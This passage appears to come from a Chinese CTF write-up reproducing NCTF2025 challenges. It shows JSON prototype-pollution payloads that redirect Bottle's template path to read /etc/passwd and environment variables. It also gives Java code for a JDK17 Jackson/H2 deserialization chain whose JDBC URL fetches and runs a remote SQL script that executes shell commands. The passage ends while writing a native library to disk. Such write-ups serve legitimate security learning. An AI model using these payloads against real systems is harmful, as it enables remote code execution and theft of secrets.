alt="image-20250324145205642"></p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;__globals__.__forbidden_name__&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;value&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/03/26/NCTF2025%E5%A4%8D%E7%8E%B0/CTF\Game\NCTF2025\assets\image-20250324145218751.png" alt="image-20250324145218751"></p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;__globals__.__forbidden_path__&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;value&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>全部污染成功，现在也可以直接去拿bottle了，那么接下来要污染bottle的什么地方呢，接下来去看一下他的template函数</p><p><img src="https://cdn.clown2024.cn/image-20250324150136967.png" alt="image-20250324150136967"></p><p>有一个TEMPLATE_PATH</p><p><img src="https://cdn.clown2024.cn/image-20250324150451450.png" alt="image-20250324150451450"></p><p>他的作用应该是用来规定模板的搜索路径，表示框架会依次在 <strong>当前目录</strong> 和 <strong><code>views/</code>子目录</strong> 下查找模板文件</p><p>那我们修改一下他的搜索路径为&#x2F;proc&#x2F;self即可，然后path传参的时候加上environ就可以获得环境变量了</p><p>这里注意一定要是列表的形式</p><p>先读一下&#x2F;etc&#x2F;passwd试试</p><p><img src="https://cdn.clown2024.cn/image-20250324151251417.png" alt="image-20250324151251417"></p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;TEMPLATE_PATH&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;value&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;/etc&quot;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20250324151304046.png" alt="image-20250324151304046"></p><p>好的成功，那接下来去读environ就可以了</p><p><img src="https://cdn.clown2024.cn/image-20250324151409375.png" alt="image-20250324151409375"></p><p><img src="https://cdn.clown2024.cn/image-20250324151403402.png" alt="image-20250324151403402"></p><h1 id="h2_revenge"><a href="#H2-revenge" class="headerlink" title="H2_revenge"></a>H2_revenge</h1><p>jdk17的h2的rce</p><p>网上很大一部分都是h2的1.x的版本，不知道有没有影响，这个h2是2.x的版本</p><p><img src="https://cdn.clown2024.cn/image-20250324152650526.png" alt="image-20250324152650526"></p><p>就两个依赖，一个h2，一个springboot-web，默认其附带jackson</p><p><img src="https://cdn.clown2024.cn/image-20250324154502086.png" alt="image-20250324154502086"></p><p>controller也非常简单，就是base64解码之后反序列化</p><p>然后还有一个题目自己写的MyDataSource</p><p><img src="https://cdn.clown2024.cn/image-20250324154621499.png" alt="image-20250324154621499"></p><p>我觉得这个肯定是需要用到的</p><p>但是h2我不是很熟，没有调试过</p><p>首先这里是默认了有jackson依赖可以打jackson反序列化的，但是最终执行点的TemplatesImpl在JDK17下面是没有的了，需要替换，然后搜索到这样一篇文章：<a href="https://www.qwzf.top/2023/04/22/Java%2017%E5%8F%8A%E6%9B%B4%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%AD%E9%80%9A%E8%BF%87JDBC%E8%BF%9E%E6%8E%A5%E5%AE%9E%E7%8E%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">https://www.qwzf.top/2023/04/22/Java%2017%E5%8F%8A%E6%9B%B4%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%AD%E9%80%9A%E8%BF%87JDBC%E8%BF%9E%E6%8E%A5%E5%AE%9E%E7%8E%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</a></p><p>这就是在高版本下用来替换TemplatesImpl的一种方法</p><p>h2的测试代码</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.NCTF2025;<br><br><span class="hljs-keyword">import</span> java.sql.Connection;<br><span class="hljs-keyword">import</span> java.sql.DriverManager;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">H2JDBC</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://127.0.0.1:8008/poc.sql&#x27;&quot;</span>;<br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-type">Connection</span> <span class="hljs-variable">con</span> <span class="hljs-operator">=</span> DriverManager.getConnection(url);<br>        &#125;<span class="hljs-keyword">catch</span> (SQLException ex) &#123;<br>            ex.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>poc.sql的代码</p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> ALIAS SHELLEXEC <span class="hljs-keyword">AS</span> $$ String shellexec(String cmd) throws java.io.IOException &#123;<br>        java.util.Scanner s <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> java.util.Scanner(Runtime.getRuntime().<span class="hljs-keyword">exec</span>(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;);<br>        <span class="hljs-keyword">return</span> s.hasNext() ? s.next() : &quot;&quot;;  &#125;<br>$$;<br><span class="hljs-keyword">CALL</span> SHELLEXEC(<span class="hljs-string">&#x27;calc&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20250324171319485.png" alt="image-20250324171319485"></p><p>然后打算用BadAttributeValueExpException来触发toString，但是这里jdk17需要绕过module来反射修改变量，我尝试之后他还是进行了报错</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.NCTF2025;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">// 将TemplatesImpl改成MyDataSource</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://192.168.121.164:8008/poc.sql&#x27;&quot;</span>;<br>        <span class="hljs-type">MyDataSource</span> <span class="hljs-variable">myDataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyDataSource</span>(url,<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(myDataSource);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">// 这里要改成高版本反射赋值val才行，不能直接构造函数来设置，因为构造函数是使用的val.toString()来设置的</span><br>        Class&lt;?&gt; unSafe=Class.forName(<span class="hljs-string">&quot;sun.misc.Unsafe&quot;</span>);<br>        Field unSafeField=unSafe.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        unSafeField.setAccessible(<span class="hljs-literal">true</span>);<br>        Unsafe unSafeClass= (Unsafe) unSafeField.get(<span class="hljs-literal">null</span>);<span class="hljs-comment">//获取Unsafe实例</span><br>        <span class="hljs-comment">//获取ClassLoader的module</span><br>        Module baseModule=Object.class.getModule();<br>        <span class="hljs-comment">//更改当前运行类的Module</span><br>        Class&lt;?&gt; currentClass= exp.class;<br>        <span class="hljs-type">long</span> addr=unSafeClass.objectFieldOffset(Class.class.getDeclaredField(<span class="hljs-string">&quot;module&quot;</span>));<br>        unSafeClass.getAndSetObject(currentClass,addr,baseModule);<br>        <span class="hljs-comment">//现在就能正常反射了</span><br><span class="hljs-comment">//        Field valField = ClassLoader.class.getDeclaredField(&quot;val&quot;);</span><br><span class="hljs-comment">//        valField.setAccessible(true);</span><br><span class="hljs-comment">//        valField.set(val, jsonNodes);</span><br>        setValue(val,<span class="hljs-string">&quot;val&quot;</span>,jsonNodes);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(val);<br>        <span class="hljs-comment">// 打印base64的payload</span><br>        System.out.println(Base64.getEncoder().encodeToString(barr.toByteArray()));<br><span class="hljs-comment">//        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));</span><br><span class="hljs-comment">//        Object o = (Object)ois.readObject();</span><br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20250324201141317.png" alt="image-20250324201141317"></p><p>没理解，找了一下文章：<a href="https://forum.butian.net/share/3748%EF%BC%8C%E8%BF%99%E7%AF%87%E7%9A%84%E5%86%99%E6%B3%95%E4%B9%9F%E6%98%AF%E4%B8%80%E6%A0%B7%E7%9A%84%EF%BC%8C%E4%B8%8D%E7%9F%A5%E9%81%93%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E4%B8%8D%E8%A1%8C">https://forum.butian.net/share/3748，这篇的写法也是一样的，不知道为什么会不行</a></p><p>后来进去源码看了一下，发现val被固定为String了</p><p><img src="https://cdn.clown2024.cn/image-20250324203801431.png" alt="image-20250324203801431"></p><p>jdk8的时候是Object，所以不行</p><p>那只能换一个触发toString的链子了</p><p>这里找到EventListener这个链子，文章：<a href="http://www.bmth666.cn/2024/03/31/%E7%AC%AC%E4%BA%8C%E5%B1%8A-AliyunCTF-chain17%E5%A4%8D%E7%8E%B0/index.html">http://www.bmth666.cn/2024/03/31/%E7%AC%AC%E4%BA%8C%E5%B1%8A-AliyunCTF-chain17%E5%A4%8D%E7%8E%B0/index.html</a></p><p>换成EventListener就可以了</p><p>本地能成的exp如下</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.NCTF2025;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.swing.event.EventListenerList;<br><span class="hljs-keyword">import</span> javax.swing.undo.UndoManager;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.Vector;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">// 将TemplatesImpl改成MyDataSource</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://127.0.0.1:8008/poc.sql&#x27;&quot;</span>;<br>        <span class="hljs-type">MyDataSource</span> <span class="hljs-variable">myDataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyDataSource</span>(url,<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(myDataSource);<br><span class="hljs-comment">//        BadAttributeValueExpException val = new BadAttributeValueExpException(null);</span><br>        <span class="hljs-comment">// 这里要改成高版本反射赋值val才行，不能直接构造函数来设置，因为构造函数是使用的val.toString()来设置的</span><br>        Class&lt;?&gt; unSafe=Class.forName(<span class="hljs-string">&quot;sun.misc.Unsafe&quot;</span>);<br>        Field unSafeField=unSafe.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        unSafeField.setAccessible(<span class="hljs-literal">true</span>);<br>        Unsafe unSafeClass= (Unsafe) unSafeField.get(<span class="hljs-literal">null</span>);<span class="hljs-comment">//获取Unsafe实例</span><br>        <span class="hljs-comment">//获取ClassLoader的module</span><br>        Module baseModule=Object.class.getModule();<br>        <span class="hljs-comment">//更改当前运行类的Module</span><br>        Class&lt;?&gt; currentClass= exp.class;<br>        <span class="hljs-type">long</span> addr=unSafeClass.objectFieldOffset(Class.class.getDeclaredField(<span class="hljs-string">&quot;module&quot;</span>));<br>        unSafeClass.getAndSetObject(currentClass,addr,baseModule);<br>        <span class="hljs-comment">//现在就能正常反射了</span><br><span class="hljs-comment">//        setValue(val,&quot;val&quot;,jsonNodes);</span><br>        <span class="hljs-comment">// EventListener</span><br>        <span class="hljs-type">EventListenerList</span> <span class="hljs-variable">eventListenerList</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventListenerList</span>();<br>        <span class="hljs-type">UndoManager</span> <span class="hljs-variable">undoManager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UndoManager</span>();<br>        <span class="hljs-type">Vector</span> <span class="hljs-variable">vector</span> <span class="hljs-operator">=</span> (Vector) getFieldValue(undoManager, <span class="hljs-string">&quot;edits&quot;</span>);<br>        vector.add(jsonNodes);<br>        setValue(eventListenerList, <span class="hljs-string">&quot;listenerList&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;InternalError.class, undoManager&#125;);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(eventListenerList);<br>        <span class="hljs-comment">// 打印base64的payload</span><br>        System.out.println(Base64.getEncoder().encodeToString(barr.toByteArray()));<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br><br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>            <span class="hljs-keyword">if</span> ( field != <span class="hljs-literal">null</span> )<br>                field.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( clazz.getSuperclass() != <span class="hljs-literal">null</span> )<br>                field = getField(clazz.getSuperclass(), fieldName);<br><br>            <span class="hljs-keyword">return</span> field;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( NoSuchFieldException e ) &#123;<br>            <span class="hljs-keyword">if</span> ( !clazz.getSuperclass().equals(Object.class) ) &#123;<br>                <span class="hljs-keyword">return</span> getField(clazz.getSuperclass(), fieldName);<br>            &#125;<br>            <span class="hljs-keyword">throw</span> e;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        <span class="hljs-keyword">return</span> field.get(obj);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20250324202437910.png" alt="image-20250324202437910"></p><p>然后本地起个环境去打一下试试</p><blockquote><p>这里注意一下MyDataSource的包名要和题目一致，不然会Not Found</p></blockquote><p>但是他失败了，来看一下docker的报错</p><p><img src="https://cdn.clown2024.cn/image-20250324203353164.png" alt="image-20250324203353164"></p><p>这里来了一个没有javac项目，很奇怪，去看一下dockerfile</p><p><img src="https://cdn.clown2024.cn/image-20250324203911814.png" alt="image-20250324203911814"></p><p>这里是只构建了一个jre的环境，问了一下ds</p><p><img src="https://cdn.clown2024.cn/image-20250324204029549.png" alt="image-20250324204029549"></p><p>因为程序尝试执行javac所以导致了该问题，但是为什么会运行javac呢，这是因为H2在初始化执行的那个sql里的java代码是动态编译的，所以会执行javac，然后可以翻出题人的博客找到解决方案😊</p><p><a href="https://exp10it.io/2024/03/solarwinds-security-event-manager-amf-deserialization-rce-cve-2024-0692/#%E5%8F%97%E9%99%90%E5%88%B6%E7%9A%84-jdbc-h2-rce">https://exp10it.io/2024/03/solarwinds-security-event-manager-amf-deserialization-rce-cve-2024-0692/#%E5%8F%97%E9%99%90%E5%88%B6%E7%9A%84-jdbc-h2-rce</a></p><p><img src="https://cdn.clown2024.cn/image-20250324205843602.png" alt="image-20250324205843602"></p><p>里面提到</p><blockquote><p>H2 的 CREATE ALIAS 仍然可以调用位于 classpath 内的某个公共类的公共静态方法, 这点与 Oracle 类似</p></blockquote><p>意思就是可以直接绑定一个静态方法然后调用，而不是内联java代码，这样就不需要动态编译，问了ds给出的示例如下</p><p><img src="https://cdn.clown2024.cn/image-20250325152213840.png" alt="image-20250325152213840"></p><p>所以文章就给出了两种思路</p><p><img src="https://cdn.clown2024.cn/image-20250325160043356.png" alt="image-20250325160043356"></p><blockquote><p>这里我一开始想那直接命令执行不就可以了吗，java.lang.Runtime.getRuntime()也是静态方法，文章中提到，在 H2 中, Java 的 java.lang.Object 类型对应数据库的 <code>JAVA_OBJECT</code> 类型，总结就是JAVA_OBJECT对应的对象一定是要可序列化的</p></blockquote><p>但是这两种思路的额外依赖我都没有，需要找找有没有其他静态写文件的静态方法</p><p>这里找到一个原生<code>java.nio.file.Files</code> 类的 <code>write</code> 方法</p><p>但是这里write方法需要传递File类型的参数，所以还要找一个静态方法返回File的，这里找到File.createTempFile()方法</p><p>接下来需要再找一个能够调用实例方法的静态方法，因为我们需要File的getAbsoluteFile方法来获取文件的绝对路径，这里是Spring环境，可以找到ReflectionUtils.findMethod方法来获取Method，找到ReflectionUtils.invokeMethod来调用Method</p><p>这里还提到了一个问题</p><p><img src="https://cdn.clown2024.cn/image-20250325233703045.png" alt="image-20250325233703045"></p><p>因为虽然getAbsolutePath返回的是String，但是我们是通过ReflectionUtils.invokeMethod来调用的，他默认返回的就是Object，我这里就找到静态方法String.valueOf可以将其转换成String，然后就可以System.load了</p><p>最后在java代码中写出来的流程大致如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.NCTF2025;<br><br><span class="hljs-keyword">import</span> com.google.common.io.Files;<br><span class="hljs-keyword">import</span> org.springframework.util.ReflectionUtils;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">// 静态创建临时文件的方法</span><br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> File.createTempFile(<span class="hljs-string">&quot;exp&quot;</span>, <span class="hljs-string">&quot;.so&quot;</span>);<br>        <span class="hljs-comment">// 静态写文件的方法</span><br>        Files.write(<span class="hljs-string">&quot;test&quot;</span>.getBytes(), file);<br>        System.out.println(file.getAbsolutePath());<br>        <span class="hljs-comment">// 还有找一个能够调用实例方法的静态方法，这里找到spring依赖下的利用</span><br>        <span class="hljs-comment">// 先找到方法</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> ReflectionUtils.findMethod(File.class, <span class="hljs-string">&quot;getAbsoluteFile&quot;</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">// 然后调用getAbsoluteFile</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">pathObject</span> <span class="hljs-operator">=</span> ReflectionUtils.invokeMethod(method, file);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> String.valueOf(pathObject);<br>        <span class="hljs-comment">// 调用System.load</span><br>        System.load(path);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后要注意编译出来的 .so 比较大, 转成 Hex 后字符串的长度过长, 直接写会报错, 需要分块写入。</p><p>然后这里问一下deepseek h2怎么将内容转换成字节，因为write方法只接受字节，然后吧问了之后发现，h2可以之接写文件，那我上面写的这么多直接就不需要了。。。。</p><p><img src="https://cdn.clown2024.cn/image-20250326001852639.png" alt="image-20250326001852639"></p><p>这直接写就完事了。。。</p><p>但是上面分析了这么多不能浪费，硬着头皮也得写下去，现在再找一个能够用静态方法转换成字节数组的，这里在java中没有直接找到相关，然后这里转换了一下思路，采用base64解码的形式来进行转换，然后中间就会又经过好几个步骤</p><p>经过一番尝试，最终还是失败了，卡在了String转成字节数组的部分，放个失败的java代码😭</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.NCTF2025;<br><br><span class="hljs-keyword">import</span> com.google.common.io.Files;<br><span class="hljs-keyword">import</span> org.springframework.util.ReflectionUtils;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">// 静态创建临时文件的方法</span><br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> File.createTempFile(<span class="hljs-string">&quot;exp&quot;</span>, <span class="hljs-string">&quot;.so&quot;</span>);<br>        <span class="hljs-comment">// 调用静态方法获取decoder</span><br>        Base64.<span class="hljs-type">Decoder</span> <span class="hljs-variable">decoder</span> <span class="hljs-operator">=</span> Base64.getDecoder();<br>        <span class="hljs-comment">// 获取实例方法</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">decode</span> <span class="hljs-operator">=</span> ReflectionUtils.findMethod(Base64.Decoder.class, <span class="hljs-string">&quot;decode&quot;</span>, String.class);<br>        <span class="hljs-comment">// 调用实例方法</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">soObject</span> <span class="hljs-operator">=</span> ReflectionUtils.invokeMethod(decode, decoder, <span class="hljs-string">&quot;&lt;.so的base64形式&gt;&quot;</span>);<br>        <span class="hljs-comment">// 转换成字节</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">soString</span> <span class="hljs-operator">=</span> String.valueOf(soObject);<br>        <span class="hljs-comment">// 转不过来了，失败了。。。。</span><br>        <span class="hljs-type">Byte</span> <span class="hljs-variable">so</span> <span class="hljs-operator">=</span> Byte.valueOf(soString);<br>        <span class="hljs-comment">// 静态写文件的方法</span><br>        Files.write(<span class="hljs-string">&quot;test&quot;</span>.getBytes(), file);<br>        System.out.println(file.getAbsolutePath());<br>        <span class="hljs-comment">// 还有找一个能够调用实例方法的静态方法，这里找到spring依赖下的利用</span><br>        <span class="hljs-comment">// 先找到方法</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> ReflectionUtils.findMethod(File.class, <span class="hljs-string">&quot;getAbsoluteFile&quot;</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">// 然后调用getAbsoluteFile</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">pathObject</span> <span class="hljs-operator">=</span> ReflectionUtils.invokeMethod(method, file);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> String.valueOf(pathObject);<br>        <span class="hljs-comment">// 调用System.load</span><br>        System.load(path);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>那就还是直接用h2自带的函数来写文件吧</p><p>试了一下WRITE_FILE函数不对，再问一下deepseek</p><p><img src="https://cdn.clown2024.cn/image-20250326105035567.png" alt="image-20250326105035567"></p><p>emmm其实这给的函数还是有问题，参数位置反了</p><p>那最终写成的sql如下：</p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 写文件</span><br><span class="hljs-keyword">CALL</span> FILE_WRITE(X<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;/tmp/exp.so&#x27;</span>);<br><span 